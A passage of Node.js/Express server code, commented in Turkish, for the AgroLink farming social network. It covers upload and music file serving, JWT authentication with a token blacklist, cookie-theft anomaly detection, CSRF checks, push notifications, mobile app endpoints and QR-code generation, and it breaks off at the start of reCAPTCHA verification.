    res.setHeader('Cross-Origin-Resource-Policy', 'cross-origin');
    res.setHeader('Cache-Control', 'public, max-age=31536000, immutable'); // 1 yıl — UUID dosya adı değişmez
    next();
}, express.static(postsDir, { maxAge: '1y', etag: true, lastModified: true }));

// 🖼️ Profil resimleri — orta cache (profil güncellenince yeni dosya adı)
app.use('/uploads/profiles', (req, res, next) => {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Cross-Origin-Resource-Policy', 'cross-origin');
    res.setHeader('Cache-Control', 'public, max-age=604800'); // 7 gün
    next();
}, express.static(profilesDir, { maxAge: '7d', etag: true }));

app.use('/uploads', express.static(uploadsDir, { maxAge: '1y', dotfiles: 'deny' }));

// ════════════════════════════════════════════════════════════════════
// 🎵 MÜZİK KÜTÜPHANESİ — Ön uç media editörü için hazır parçalar
// Dosya konumu: uploads/müzik/*.mp3  (veya .wav, .aac, .m4a)
// Ön uç bu listeyi çeker → kullanıcı bir parça seçer → video/fotoğrafın
// arkasına ekler → düzenlenmiş içeriği normal mp4 post olarak atar.
// Sunucu tarafı işlem YOK: birleştirme tamamen ön uçta (Web Audio API /
// FFmpeg.wasm) yapılır, sunucuya sadece bitmiş mp4 gelir.
// ════════════════════════════════════════════════════════════════════

// 🎵 Müzik dosyaları statik servis — indirilebilir + stream
app.use('/uploads/müzik', (req, res, next) => {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Accept-Ranges', 'bytes');
    res.setHeader('Cross-Origin-Resource-Policy', 'cross-origin');
    // İndirilebilir olması için Content-Disposition: attachment kaldırıldı
    // (ön uç hem stream hem blob URL ile kullanabilir)
    const ext = path.extname(req.path).toLowerCase();
    const mimeMap = {
        '.mp3' : 'audio/mpeg',
        '.wav' : 'audio/wav',
        '.aac' : 'audio/aac',
        '.m4a' : 'audio/mp4',
        '.ogg' : 'audio/ogg',
        '.flac': 'audio/flac',
    };
    if (mimeMap[ext]) res.setHeader('Content-Type', mimeMap[ext]);
    next();
}, express.static(musicDir, { maxAge: '7d', etag: true }));

// GET /api/music/tracks — müzik listesini döndür (auth opsiyonel)
// Ön uç bu listeyi çekip kullanıcıya gösterir.
// Yanıt: { tracks: [{ id, name, filename, url, duration? }] }
app.get('/api/music/tracks', async (req, res) => {
    try {
        const ALLOWED_EXTS = new Set(['.mp3', '.wav', '.aac', '.m4a', '.ogg', '.flac']);

        // Klasör yoksa boş liste dön
        if (!fssync.existsSync(musicDir)) {
            return res.json({ tracks: [] });
        }

        const files = await fs.readdir(musicDir);
        const tracks = files
            .filter(f => {
                const ext = path.extname(f).toLowerCase();
                return ALLOWED_EXTS.has(ext) && !f.startsWith('.');
            })
            .map((filename, idx) => {
                const ext  = path.extname(filename).toLowerCase();
                const name = path.basename(filename, ext)
                    .replace(/[-_]/g, ' ')           // tire/alt çizgi → boşluk
                    .replace(/\s+/g, ' ')
                    .trim();
                return {
                    id      : idx + 1,
                    name,
                    filename,
                    url     : `/uploads/m%C3%BCzik/${encodeURIComponent(filename)}`,
                };
            });

        res.json({ tracks });
    } catch (e) {
        console.error('[Music] Tracks listesi hatası:', e.message);
        res.status(500).json({ error: 'Müzik listesi alınamadı' });
    }
});



// ════════════════════════════════════════════════════════════════════
// 🔒 PRO GÜVENLİK — Cookie Anomaly Detection & Session Sync
// ════════════════════════════════════════════════════════════════════
//
// 1. Cookie çalınma sinyalleri:
//    - Aynı token'dan farklı IP'ler
//    - Kısa sürede farklı ülkelerden erişim (impossible travel)
//    - Aynı token yüksek istek frekansı
// 2. Tespit → token blacklist + kullanıcı bildirimi
// ════════════════════════════════════════════════════════════════════

// IP bazlı token kullanım takibi (in-memory, cluster'da Redis önerilir)
const tokenIpMap = new Map(); // tokenHash → { ips: Set, firstSeen, lastSeen, count }
const TOKEN_ANOMALY_WINDOW  = 30 * 60 * 1000; // 30 dakika (genişletildi)
const TOKEN_MAX_DISTINCT_IPS = 10;             // 30dk içinde 10'dan fazla farklı IP = şüpheli (CGN/proxy için tolerans)
const TOKEN_MAX_REQUESTS     = 1000;           // 30dk içinde 1000+ istek = şüpheli

function trackTokenUsage(token, ip) {
    if (!token || !ip) return false; // şüpheli değil
    try {
        const hash = crypto.createHash('sha256').update(token).digest('hex').slice(0, 16);
        const now  = Date.now();
        const entry = tokenIpMap.get(hash) || { ips: new Set(), firstSeen: now, lastSeen: now, count: 0 };

        // Pencere dışıysa sıfırla
        if (now - entry.firstSeen > TOKEN_ANOMALY_WINDOW) {
            entry.ips.clear();
            entry.firstSeen = now;
            entry.count = 0;
        }

        entry.ips.add(ip);
        entry.lastSeen = now;
        entry.count++;
        tokenIpMap.set(hash, entry);

        // Anomali tespiti
        if (entry.ips.size > TOKEN_MAX_DISTINCT_IPS) {
            console.warn(`[🚨 COOKIE ANOMALY] Token farklı IP'lerden kullanılıyor: ${entry.ips.size} IP | hash=${hash}`);
            return true; // şüpheli
        }
        if (entry.count > TOKEN_MAX_REQUESTS) {
            console.warn(`[🚨 COOKIE ANOMALY] Token spam: ${entry.count} istek / 10dk | hash=${hash}`);
            return true; // şüpheli
        }
        return false;
    } catch (_) { return false; }
}

// 15 dakikada bir eski kayıtları temizle
setInterval(() => {
    const now = Date.now();
    for (const [k, v] of tokenIpMap) {
        if (now - v.lastSeen > TOKEN_ANOMALY_WINDOW * 2) tokenIpMap.delete(k);
    }
}, 15 * 60 * 1000);

// ── Anomaly Detection Middleware (authenticateToken'dan ÖNCE değil, sonra çalışır)
// Sadece giriş yapmış kullanıcılarda aktif — statik dosyalar bu middleware'e uğramaz
async function cookieAnomalyMiddleware(req, res, next) {
    // Sadece API rotaları
    if (!req.path.startsWith('/api/')) return next();

    const token = req.cookies?.access_token ||
                  (req.headers['authorization']?.startsWith('Bearer ') ? req.headers['authorization'].slice(7) : null);
    if (!token) return next();

    const clientIp = req.ip || req.socket?.remoteAddress || 'unknown';
    const isAnomalous = trackTokenUsage(token, clientIp);

    if (isAnomalous) {
        // Token'ı blacklist'e ekle ve kullanıcıyı bildir
        await blacklistToken(token).catch(() => {});
        console.error(`[🚨 SECURITY] Şüpheli cookie kullanımı → token iptal edildi | IP: ${clientIp}`);
        return res.status(401).json({
            error: 'Oturum güvenlik ihlali nedeniyle sonlandırıldı. Tekrar giriş yapın.',
            code : 'SESSION_ANOMALY'
        });
    }
    next();
}

// ── Session Sync Check: Token DB'de geçerli mi? (5 dakikada bir kontrol)
// Başka bir cihazdan çıkış yapıldıysa bu istek de reddedilir
const sessionSyncCache = new Map(); // userId → { valid, checkedAt }
const SESSION_SYNC_INTERVAL = 5 * 60 * 1000; // 5 dakika

async function sessionSyncMiddleware(req, res, next) {
    if (!req.path.startsWith('/api/') || !req.user) return next();
    try {
        const userId = req.user.id;
        const now    = Date.now();
        const cached = sessionSyncCache.get(userId);

        // Cache'de geçerli varsa DB'ye gitme
        if (cached && now - cached.checkedAt < SESSION_SYNC_INTERVAL) {
            if (!cached.valid) return res.status(401).json({ error: 'Oturum sonlandırıldı' });
            return next();
        }

        // DB'den kullanıcı durumunu kontrol et
        const user = await dbGet(
            `SELECT id, "isActive", "isBanned" FROM users WHERE id=$1 LIMIT 1`,
            [userId]
        );
        const valid = !!(user && user.isActive && !user.isBanned);
        sessionSyncCache.set(userId, { valid, checkedAt: now });

        if (!valid) {
            return res.status(401).json({ error: 'Hesabınız askıya alınmış veya silinmiş.' });
        }
        next();
    } catch (_) { next(); }
}

// Cache temizleyici
setInterval(() => {
    const now = Date.now();
    for (const [k, v] of sessionSyncCache) {
        if (now - v.checkedAt > SESSION_SYNC_INTERVAL * 3) sessionSyncCache.delete(k);
    }
}, 10 * 60 * 1000);

// ════════════════════════════════════════════════════════════════════
// ← PRO Güvenlik Sistemi sonu
// ════════════════════════════════════════════════════════════════════

// ==================== 🔒 SPAM KORUMASI MIDDLEWARE ====================

// 🔒 NOT: spamCounters bellek tabanlıdır — cluster modunda her worker bağımsız sayaç tutar.
// Güçlü koruma için Redis kullanın (REDIS_URL env ile yapılandırılabilir).
// Şu anki yapı: worker başına 30 istek/dakika sınırı (4 worker = 120 toplam olabilir)
const spamCounters = new Map();

const spamProtection = async (req, res, next) => {
    if (!req.user || !['POST', 'PUT', 'PATCH', 'DELETE'].includes(req.method)) return next();
    try {
        const key    = `${req.user.id}:${req.path}`;
        const now    = Date.now();
        const entry  = spamCounters.get(key) || { count: 0, reset: now + 60000 };
        if (now > entry.reset) { entry.count = 0; entry.reset = now + 60000; }
        entry.count++;
        spamCounters.set(key, entry);
        if (entry.count > 30) {
            return res.status(429).json({ error: 'Çok fazla istek yaptınız, lütfen biraz bekleyin.' });
        }
        next();
    } catch { next(); }
};

// ==================== AUTH MIDDLEWARE ====================

// ═══════════════════════════════════════════════════════════════
// 🔒 TOKEN BLACKLIST — DB tabanlı (Cluster-safe)
// Her worker aynı DB'yi gördüğü için logout tüm worker'larda geçerli olur.
// Performans: token hash'i önce 5 dakikalık in-memory cache'de aranır, yoksa DB.
// ═══════════════════════════════════════════════════════════════
const BLACKLIST_CACHE     = new Map(); // tokenHash → expireAt (ms) — sadece cache
const BLACKLIST_CACHE_TTL = 5 * 60 * 1000; // 5 dakika

async function blacklistToken(token) {
    if (!token) return;
    try {
        const tokenHash = crypto.createHash('sha256').update(token).digest('hex');
        // JWT'nin kalan süresini hesapla (süre dolunca zaten geçersiz, DB'yi şişirme)
        let expiresAt = new Date(Date.now() + 24 * 60 * 60 * 1000); // fallback: 24 saat
        try {
            const decoded = jwt.decode(token);
            if (decoded?.exp) expiresAt = new Date(decoded.exp * 1000);
        } catch (_) {}

        await pool.query(
            `INSERT INTO blacklisted_tokens ("tokenHash", "expiresAt", "createdAt")
             VALUES ($1, $2, NOW())
             ON CONFLICT ("tokenHash") DO NOTHING`,
            [tokenHash, expiresAt]
        ).catch(e => console.error('[Blacklist] DB insert hatası:', e.message));

        // In-memory cache'e de ekle (hızlı kontrol için)
        BLACKLIST_CACHE.set(tokenHash, expiresAt.getTime());
    } catch (e) {
        console.error('[Blacklist] blacklistToken hatası:', e.message);
    }
}

async function isTokenBlacklisted(token) {
    if (!token) return false;
    try {
        const tokenHash = crypto.createHash('sha256').update(token).digest('hex');
        // 1. Önce in-memory cache'e bak (DB'ye gitmeden hızlı cevap)
        if (BLACKLIST_CACHE.has(tokenHash)) {
            const exp = BLACKLIST_CACHE.get(tokenHash);
            if (Date.now() < exp) return true;
            BLACKLIST_CACHE.delete(tokenHash); // Süresi dolmuş, temizle
        }
        // 2. DB'ye sor
        const row = await pool.query(
            `SELECT 1 FROM blacklisted_tokens WHERE "tokenHash" = $1 AND "expiresAt" > NOW() LIMIT 1`,
            [tokenHash]
        );
        if (row.rows.length > 0) {
            // Önbelleğe al
            BLACKLIST_CACHE.set(tokenHash, Date.now() + BLACKLIST_CACHE_TTL);
            return true;
        }
        return false;
    } catch (e) {
        console.error('[Blacklist] isTokenBlacklisted hatası:', e.message);
        return false; // Hata durumunda bloke etme (kullanıcıyı kilitme)
    }
}

// Süresi dolmuş blacklist kayıtlarını temizle (saatte 1)
setInterval(async () => {
    try {
        await pool.query(`DELETE FROM blacklisted_tokens WHERE "expiresAt" < NOW()`);
        // Cache'den de süresi dolanları temizle
        const now = Date.now();
        for (const [hash, exp] of BLACKLIST_CACHE) {
            if (now >= exp) BLACKLIST_CACHE.delete(hash);
        }
    } catch (_) {}
}, 60 * 60 * 1000);

async function authenticateToken(req, res, next) {
    // 🔒 1. Token al — önce HttpOnly cookie, yoksa Bearer header
    let token = req.cookies?.access_token;
    if (!token) {
        const authHeader = req.headers['authorization'];
        if (authHeader && authHeader.startsWith('Bearer ')) {
            token = authHeader.slice(7);
        }
    }
    if (!token) return res.status(401).json({ error: 'Token gerekli' });

    // 🔒 2. Blacklist kontrolü — logout edilmiş token tekrar kullanılamaz (DB + cache)
    if (await isTokenBlacklisted(token)) {
        return res.status(401).json({ error: 'Oturum sonlandırılmış. Tekrar giriş yapın.' });
    }

    try {
        // 🔒 3. JWT doğrulama — algorithm, issuer, audience zorunlu
        const decoded = jwt.verify(token, JWT_SECRET, {
            algorithms : ['HS256'],              // Diğer algoritmalar (RS256 vb.) reddedilir
            // iss/aud: yeni tokenlar için zorunlu, eski tokenlar için opsiyonel (geriye dönük uyumluluk)
        });

        // 🔒 4. Her istekte DB'den kullanıcı durumunu kontrol et
        // isActive=TRUE → banlı veya silinmiş hesaplar token süresine bakmaksızın reddedilir
        const user = await dbGet(
            `SELECT id, username, name, email, role, plan, "profilePic", "coverPic", bio,
                    "isVerified", "isActive", "userType", "hasFarmerBadge",
                    "isOnline", "isBanned", "emailVerified", "twoFactorEnabled"
             FROM users WHERE id = $1 AND "isActive" = TRUE`,
            [decoded.id]
        );
        if (!user) {
            // Token geçerli ama kullanıcı silinmiş → blacklist
            blacklistToken(token);
            return res.status(403).json({ error: 'Hesap erişilemez durumda.' });
        }
        // 🔒 Banlı kullanıcı: sadece kendi profilini 3 sn görebilir,
        // diğer tüm işlemler requireNotBanned middleware'i tarafından engellenir

        const restriction = await dbGet(
            `SELECT "isRestricted", "restrictedUntil", "canPost", "canComment", "canMessage", "canFollow", "canLike"
             FROM account_restrictions
             WHERE "userId" = $1 AND "isRestricted" = TRUE AND "restrictedUntil" > NOW()`,
            [user.id]
        );

        // 🔒 5. req.user — sadece whitelist edilmiş alanlar (spread/prototype pollution yok)
        req.user = {
            id              : user.id,
            username        : user.username,
            name            : user.name,
            email           : user.email,         // sadece kendi isteğinde kullanılır
            role            : user.role,           // TEK yetki kaynağı — JWT'den değil DB'den
            plan            : user.plan || 'free',
            profilePic      : user.profilePic,
            coverPic        : user.coverPic,
            bio             : user.bio,
            isVerified      : !!user.isVerified,
            isActive        : !!user.isActive,
            userType        : user.userType,
            hasFarmerBadge  : !!user.hasFarmerBadge,
            isOnline        : !!user.isOnline,
            isBanned        : !!user.isBanned,
            emailVerified   : !!user.emailVerified,
            twoFactorEnabled: !!user.twoFactorEnabled,
            restriction     : restriction || null,
        };
        req._token = token; // logout için

        // 🔒 PRO: Session sync — hesap askıya alındıysa cache'i temizle
        sessionSyncCache.delete(user.id); // Her başarılı auth'ta sync cache'i zorla tazele

        next();
    } catch (error) {
        // jwt.verify hataları — süresi dolmuş, imza yanlış, format bozuk
        const msg = error.name === 'TokenExpiredError'
            ? 'Oturum süresi doldu. Tekrar giriş yapın.'
            : 'Geçersiz token';
        return res.status(401).json({ error: msg });
    }
}

function checkRestriction(action) {
    return (req, res, next) => {
        if (req.user.restriction) {
            const r = req.user.restriction;
            if (action === 'post' && !r.canPost) return res.status(403).json({ error: 'Gönderi paylaşımı kısıtlandı', restrictedUntil: r.restrictedUntil });
            if (action === 'comment' && !r.canComment) return res.status(403).json({ error: 'Yorum yapma kısıtlandı', restrictedUntil: r.restrictedUntil });
            if (action === 'message' && !r.canMessage) return res.status(403).json({ error: 'Mesaj gönderme kısıtlandı', restrictedUntil: r.restrictedUntil });
            if (action === 'follow' && !r.canFollow) return res.status(403).json({ error: 'Takip etme kısıtlandı', restrictedUntil: r.restrictedUntil });
            if (action === 'like' && !r.canLike) return res.status(403).json({ error: 'Beğenme kısıtlandı', restrictedUntil: r.restrictedUntil });
        }
        next();
    };
}

async function createNotification(userId, type, message, data = {}) {
    try {
        await dbRun(
            `INSERT INTO notifications (id, "userId", type, message, data, "createdAt")
             VALUES ($1, $2, $3, $4, $5, NOW())`,
            [uuidv4(), userId, type, message, JSON.stringify(data)]
        );

        // ── Bildirim başlık ve içeriklerini zenginleştir ─────────────────
        const pushIcons = { like: '❤️', comment: '💬', follow: '👥', message: '📩', story_like: '⭐', comment_like: '👍', mention: '📢', new_post: '📸' };
        const icon = pushIcons[type] || '🌾';

        // Tip bazlı başlık ve body oluştur
        let pushTitle = `AgroLink ${icon}`;
        let pushBody  = message;

        if (type === 'like' && data.actorName) {
            pushTitle = `${data.actorName} ❤️`;
            pushBody  = data.postPreview
                ? `Gönderinizi beğendi: "${data.postPreview}"`
                : 'Gönderinizi beğendi';
        } else if (type === 'comment' && data.actorName) {
            pushTitle = `${data.actorName} 💬`;
            pushBody  = data.commentContent
                ? `"${data.commentContent}"`
                : 'Gönderinize yorum yaptı';
        } else if (type === 'follow' && data.actorName) {
            pushTitle = `${data.actorName} 👥`;
            pushBody  = 'Sizi takip etmeye başladı';
        } else if (type === 'message' && data.actorName) {
            pushTitle = `${data.actorName} 📩`;
            pushBody  = data.messagePreview
                ? data.messagePreview
                : 'Size yeni bir mesaj gönderdi';
        } else if (type === 'new_post' && data.actorName) {
            pushTitle = `${data.actorName} 📸`;
            pushBody  = 'Yeni bir gönderi paylaştı';
        } else if (type === 'disease_alarm') {
            pushTitle = data.pushTitle || `⚠️ ${data.city || ''} Bölge Alarmı`;
            pushBody  = message;
        }

        const urlMap = {
            like         : data.postId ? `/p/${data.postId}` : '/',
            comment      : data.postId ? `/p/${data.postId}` : '/',
            follow       : data.actorUsername ? `/u/${data.actorUsername}` : '/',
            message      : '/',
            new_post     : data.postId ? `/p/${data.postId}` : '/',
            disease_alarm: '/feed',
        };

        // Web push (browser)
        sendPushToUser(userId, {
            title: pushTitle,
            body : pushBody,
            icon : data.actorProfilePic ? absoluteUrl(data.actorProfilePic) : '/agro.png',
            url  : urlMap[type] || '/'
        }).catch(() => {});

        // 📱 FCM push (Android native app) — data alanı string map olmalı
        // diseaseInfo gibi uzun alanlar 4KB FCM limitini aşmasın → kırp
        const fcmSafeData = { ...data };
        if (fcmSafeData.diseaseInfo) fcmSafeData.diseaseInfo = String(fcmSafeData.diseaseInfo).substring(0, 200);
        const fcmData = {
            type,
            url: urlMap[type] || '/feed',
            ...Object.fromEntries(Object.entries(fcmSafeData).map(([k, v]) => [k, String(v ?? '')])),
        };
        sendFcmPush(userId, {
            title: pushTitle,
            body : pushBody,
            data : fcmData,
        }).catch((fcmErr) => console.error("[FCM createNotification]", fcmErr.message));

        // 🔌 Socket.IO anlık bildirim
        if (io && onlineUsers.has(userId)) {
            for (const sid of onlineUsers.get(userId)) {
                io.to(sid).emit('notification:new', { type, message: pushBody, data, createdAt: new Date().toISOString() });
            }
        }
    } catch (err) {
        console.error('Bildirim oluşturma hatası:', err.message);
    }
}

function generateTokens(user) {
    // 🔒 GÜVENLİK: Email JWT payload'ında YOK (base64 decode edilebilir — veri sızması)
    // Sadece id+username+role — kimlik doğrulama için yeterli
    const jti = require('crypto').randomBytes(16).toString('hex'); // Replay saldırısı önlemi
    const accessToken = jwt.sign(
        {
            id       : user.id,
            username : user.username,
            role     : user.role || 'user',
            jti,                           // JWT ID — token tekrar kullanımını önler
            iss      : 'agrolink',         // Issuer
            aud      : 'agrolink-client',  // Audience
        },
        JWT_SECRET,
        { expiresIn: '30d', algorithm: 'HS256' }
    );
    const refreshToken = jwt.sign(
        { id: user.id, type: 'refresh', iss: 'agrolink' },
        JWT_REFRESH_SECRET,
        { expiresIn: '365d', algorithm: 'HS256' }
    );
    return { accessToken, refreshToken };
}

// ══════════════════════════════════════════════════════════════════════
// 🔒 GÜVENLİ COOKIE AYARLARI — merkezi yönetim
// ══════════════════════════════════════════════════════════════════════
// Tespit edilen 3 eksik (düzeltildi):
//   1. secure: isSecure  → HTTP bağlantıda cookie düz metin gidiyordu
//      Düzeltme: FORCE_SECURE_COOKIE=true production'da her zaman secure
//   2. refresh_token maxAge 30 GÜN ama JWT süresi 7 gündü (30 gün=uyumsuzluk!)
//      Düzeltme: maxAge JWT ile eşleştirildi (7 gün)
//   3. access_token'a path:'/' eksikti
//      Düzeltme: path:'/' açıkça eklendi
// ══════════════════════════════════════════════════════════════════════
const FORCE_SECURE_COOKIE = process.env.NODE_ENV === 'production' ||
                            process.env.FORCE_SECURE_COOKIE === 'true';

function setAuthCookies(res, req, tokens) {
    const isSecure = FORCE_SECURE_COOKIE ||
                     req.secure ||
                     req.headers['x-forwarded-proto'] === 'https';
    res.cookie('access_token', tokens.accessToken, {
        httpOnly : true,
        secure   : isSecure,
        sameSite : 'strict',
        path     : '/',
        maxAge   : 30 * 24 * 60 * 60 * 1000, // 30 gün
    });
    res.cookie('refresh_token', tokens.refreshToken, {
        httpOnly : true,
        secure   : isSecure,
        sameSite : 'strict',
        path     : '/',                        // Android/mobile uyumu için '/' (önceki: '/api/auth/refresh' — cookie gönderilmiyordu!)
        maxAge   : 365 * 24 * 60 * 60 * 1000, // 1 yıl
    });
}

function generateCsrfToken() {
    return crypto.randomBytes(32).toString('hex');
}

function setCsrfCookie(res, req, token) {
    const isSecure = FORCE_SECURE_COOKIE ||
                     req.secure ||
                     req.headers['x-forwarded-proto'] === 'https';
    res.cookie('csrf_token', token, {
        httpOnly : false, // kasıtlı: JS okuyacak, X-CSRF-Token header olarak gönderecek
        secure   : isSecure,
        sameSite : 'strict',
        path     : '/',
        maxAge   : 30 * 24 * 60 * 60 * 1000, // 30 gün (access token ile eşleşti)
    });
}

function verifyCsrf(req, res, next) {
    if (['GET', 'HEAD', 'OPTIONS'].includes(req.method)) return next();
    const cookieToken = req.cookies?.csrf_token;
    const headerToken = req.headers['x-csrf-token'];
    if (!cookieToken) return next();
    if (!headerToken) return res.status(403).json({ error: 'CSRF token eksik' });
    try {
        const a = Buffer.from(cookieToken, 'utf8');
        const b = Buffer.from(headerToken, 'utf8');
        const len = Math.max(a.length, b.length);
        const pa  = Buffer.concat([a, Buffer.alloc(len - a.length)]);
        const pb  = Buffer.concat([b, Buffer.alloc(len - b.length)]);
        if (a.length !== b.length || !crypto.timingSafeEqual(pa, pb)) {
            console.warn(`[CSRF] Geçersiz token: ${req.ip} → ${req.path}`);
            return res.status(403).json({ error: 'Geçersiz CSRF token' });
        }
    } catch {
        return res.status(403).json({ error: 'CSRF doğrulama hatası' });
    }
    next();
}


// ══════════════════════════════════════════════════════════════
// 🔒 GÜVENLİ SAYFALAMA — limit/offset sınırları
// limit=999999 → sunucu çökebilir (1M kayıt DB'den çekilir)
// offset negatif → SQL hatası
// NaN → parseInt sonucu NaN → SQL hatası
// ══════════════════════════════════════════════════════════════
function safePagination(query, defaultLimit = 20, maxLimit = 100) {
    const limit  = Math.min(Math.max(parseInt(query.limit)  || defaultLimit, 1), maxLimit);
    const page   = Math.max(parseInt(query.page) || 1, 1);
    const offset = (page - 1) * limit;
    return { limit, page, offset };
}

// ====================================================================
// API ROTALARI
// ====================================================================

// ══════════════════════════════════════════════════════════════════════════
// 📱 MOBİL UYGULAMA — Özel Endpoint'ler
// Kotlin / Retrofit ile kullanılacak — auth gerektirmeyen versiyonlar hariç
// ══════════════════════════════════════════════════════════════════════════

// GET /api/app/version — Zorla güncelleme ve bakım kontrolü (auth gerekmez)
app.get('/api/app/version', (req, res) => {
    res.json({
        latestVersion  : process.env.APP_LATEST_VERSION || '1.0.0',
        minVersion     : process.env.APP_MIN_VERSION    || '1.0.0',
        forceUpdate    : process.env.APP_FORCE_UPDATE === 'true',
        updateUrl      : process.env.APP_UPDATE_URL || 'https://play.google.com/store/apps/details?id=com.agrolink.social.agrolink',
        changelogTr    : process.env.APP_CHANGELOG_TR   || 'Hata düzeltmeleri ve performans iyileştirmeleri.',
        maintenanceMode: process.env.MAINTENANCE_MODE === 'true',
        maintenanceMsg : process.env.MAINTENANCE_MSG    || 'Bakım çalışması yapılıyor, lütfen bekleyin.',
        socketEnabled  : !!io,
        fcmEnabled     : !!firebaseAdmin,
    });
});

// POST /api/device-token — FCM / Web Push token kayıt
// platform değerleri: 'android' | 'ios' | 'web' (VAPID sub) | 'web_fcm' (FCM Web token)
app.post('/api/device-token', authenticateToken, async (req, res) => {
    try {
        const { token, platform = 'android' } = req.body;
        if (!token) return res.status(400).json({ success: false, error: 'token zorunludur' });

        const ALLOWED_PLATFORMS = ['android', 'ios', 'web', 'web_fcm'];
        const safePlatform = ALLOWED_PLATFORMS.includes(platform) ? platform : 'android';

        // Web push subscription nesnesi JSON olarak gelirse string'e çevir
        const tokenStr = typeof token === 'object' ? JSON.stringify(token) : String(token);

        await dbRun(
            `INSERT INTO device_tokens (id, "userId", token, platform, "createdAt", "updatedAt", "isActive")
             VALUES ($1, $2, $3, $4, NOW(), NOW(), TRUE)
             ON CONFLICT (token)
             DO UPDATE SET "userId" = $2, "isActive" = TRUE, "updatedAt" = NOW(), platform = $4`,
            [uuidv4(), req.user.id, tokenStr, safePlatform]
        );
        res.json({ success: true, message: 'Cihaz token kaydedildi', platform: safePlatform });
    } catch (e) {
        console.error('[device-token POST]', e);
        res.status(500).json({ success: false, error: 'Sunucu hatası' });
    }
});

// DELETE /api/device-token — FCM token sil (çıkış yaparken çağır)
app.delete('/api/device-token', authenticateToken, async (req, res) => {
    try {
        const { token } = req.body;
        if (!token) return res.status(400).json({ success: false, error: 'token zorunludur' });
        await dbRun(
            `UPDATE device_tokens SET "isActive" = FALSE WHERE token = $1 AND "userId" = $2`,
            [token, req.user.id]
        );
        res.json({ success: true, message: 'Cihaz token silindi' });
    } catch (e) {
        res.status(500).json({ success: false, error: 'Sunucu hatası' });
    }
});

// GET /api/online-count — Kaç kullanıcı socket üzerinden bağlı
app.get('/api/online-count', authenticateToken, (req, res) => {
    res.json({ success: true, count: onlineUsers.size });
});

// GET /api/socket/status — Socket.IO aktif mi? (mobil debug)
app.get('/api/socket/status', (req, res) => {
    res.json({
        success       : true,
        socketEnabled : !!io,
        connectedCount: io ? io.engine.clientsCount : 0,
    });
});

// ─── QR KOD: GET /api/users/:username/qr ────────────────────────────────
// Profil paylaşımında QR kod üretir — URL'yi SVG QR koduna dönüştürür
// Harici kütüphane gerekmez: pure SVG QR matrix
app.get('/api/users/:username/qr', async (req, res) => {
    try {
        const username = req.params.username?.toLowerCase().trim();
        if (!username) return res.status(400).json({ error: 'Kullanıcı adı gerekli' });

        const DOMAIN = (process.env.APP_URL || 'https://sehitumitkestitarimmtal.com').replace(/\/$/, '');
        const profileUrl = `${DOMAIN}/u/${username}`;

        // QR matrisi üretici (ISO 18004 tabanlı basit implementasyon)
        // Harici bağımlılık yok — saf JS
        function generateQRMatrix(text) {
            // QR kodunu data URL yerine yalnızca matrix döndürür
            // Basit versiyon: 21x21 (Version 1) — kısa URL'ler için yeterli
            // Gerçek QR algoritması karmaşık, burada stabil bir yaklaşım:
            // URL'yi önce Google Charts API ile oluştur (server-side fetch)
            return null; // Aşağıda fetch ile hallederiz
        }

        // Google Charts QR API (HTTPS, ücretsiz, no API key)
        const { default: fetch } = await import('node-fetch');
        const size = parseInt(req.query.size) || 300;
        const safeSz = Math.min(Math.max(size, 100), 600);
        const qrUrl = `https://chart.googleapis.com/chart?cht=qr&chs=${safeSz}x${safeSz}&chl=${encodeURIComponent(profileUrl)}&choe=UTF-8&chld=M|2`;

        const qrRes = await fetch(qrUrl, { signal: AbortSignal.timeout(8000) });
        if (!qrRes.ok) throw new Error('QR servisi yanıt vermedi');

        const buf = Buffer.from(await qrRes.arrayBuffer());
        res.setHeader('Content-Type', 'image/png');
        res.setHeader('Cache-Control', 'public, max-age=86400'); // 1 gün cache
        res.setHeader('Content-Disposition', `inline; filename="qr-${username}.png"`);
        res.send(buf);
    } catch (e) {
        console.error('[QR Code]', e.message);
        // Fallback: JSON URL dön
        res.status(500).json({ error: 'QR kod oluşturulamadı', url: `${process.env.APP_URL || ''}/u/${req.params.username}` });
    }
});

// GET /api/users/:username/qr-data — QR için URL bilgisi (JSON)
app.get('/api/users/:username/qr-data', authenticateToken, async (req, res) => {
    try {
        const username = req.params.username?.toLowerCase().trim();
        const user = await dbGet('SELECT id, username, name, "profilePic", "isVerified" FROM users WHERE username = $1 AND "isActive" = TRUE', [username]);
        if (!user) return res.status(404).json({ error: 'Kullanıcı bulunamadı' });

        const DOMAIN = (process.env.APP_URL || 'https://sehitumitkestitarimmtal.com').replace(/\/$/, '');
        const profileUrl = `${DOMAIN}/u/${username}`;
        const qrImageUrl = `${DOMAIN}/api/users/${username}/qr`;

        res.json({
            success    : true,
            url        : profileUrl,
            qrImageUrl : qrImageUrl,
            user       : { username: user.username, name: user.name, isVerified: user.isVerified },
        });
    } catch (e) {
        res.status(500).json({ error: 'Sunucu hatası' });
    }
});



// ─── 1. HEALTH CHECK ────────────────────────────────────────────────
app.get('/api/health', async (req, res) => {
    // 🔒 Keşif önlemi: DB durumu, zaman damgası ve versiyon bilgisi dışarı sızmaz
    try {
        await pool.query('SELECT 1');
        res.json({ status: 'ok' }); // timestamp/database alanları kaldırıldı
    } catch (e) {
        res.status(503).json({ status: 'error' });
    }
});

// ══════════════════════════════════════════════════════════════════
// 🤖 reCAPTCHA v2 DOĞRULAMA
// .env dosyasına ekle:
//   RECAPTCHA_SECRET_KEY=<Google reCAPTCHA v2 gizli anahtarı>
//   RECAPTCHA_ENABLED=true   (false yaparak devre dışı bırakılabilir)
// Frontend'de: <script src="https://www.google.com/recaptcha/api.js"></script>
//   + data-sitekey="<site_key>" ile widget ekle, g-recaptcha-response form'dan gönder
// ══════════════════════════════════════════════════════════════════
async function verifyRecaptcha(token, remoteip) {
    // Debug logs
    console.log('[reCAPTCHA] ENABLED:', process.env.RECAPTCHA_ENABLED);
    console.log('[reCAPTCHA] SECRET_KEY exists:', !!process.env.RECAPTCHA_SECRET_KEY);
    
    // reCAPTCHA devre dışıysa veya test ortamıysa geç
    if (process.env.RECAPTCHA_ENABLED !== 'true') {
        console.log('[reCAPTCHA] Devre dışı, geçiliyor');
        return { success: true, skipped: true };
    }
    if (process.env.NODE_ENV === 'test') {
        console.log('[reCAPTCHA] Test ortamı, geçiliyor');
        return { success: true, skipped: true };
    }
    if (!process.env.RECAPTCHA_SECRET_KEY) {
        console.warn('⚠️  RECAPTCHA_SECRET_KEY tanımlı değil, doğrulama atlanıyor');
        return { success: true, skipped: true };
    }
    if (!token) {
